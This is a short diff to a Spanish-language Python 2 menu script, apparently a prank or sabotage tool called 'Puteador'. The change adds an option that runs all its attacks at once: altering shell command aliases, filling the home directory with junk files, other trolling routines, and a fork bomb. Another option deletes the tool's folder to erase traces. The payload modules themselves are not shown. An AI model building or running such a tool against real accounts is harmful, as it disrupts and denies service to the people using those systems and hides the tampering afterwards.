@@ -12,6 +12,7 @@ print "\t 2. Cagetizador.\n"
 print "\t 3. Cambiar alias.\n"
 print "\t 4. Trolling.\n"
 print "\t 5. Llenar home de basura.\n"
+print "\t 69. Hazlo todo a la vez xD.\n"
 print "\t 99. Salir y borrar todo.\n"
 #print "\t 6. Quijotizador.\n"
 salir=True
@@ -32,6 +33,12 @@ while not salir:
     elif opcion == 5:
         print 'frases chorras are commig'
         llenaHomeDeBasura.llenaHome()
+    elif opcion == 69:
+        print 'Puteando lo maximo'
+        cagetizador.caguetizadorPy()
+        cambiaAlias.cambiarComandos()
+        llenaHomeDeBasura.llenaHome()
+        bombaFork.fork()
     elif opcion == 99:
         print "Saliendo... y borrando rastro"
         shutil.rmtree('../Puteador')
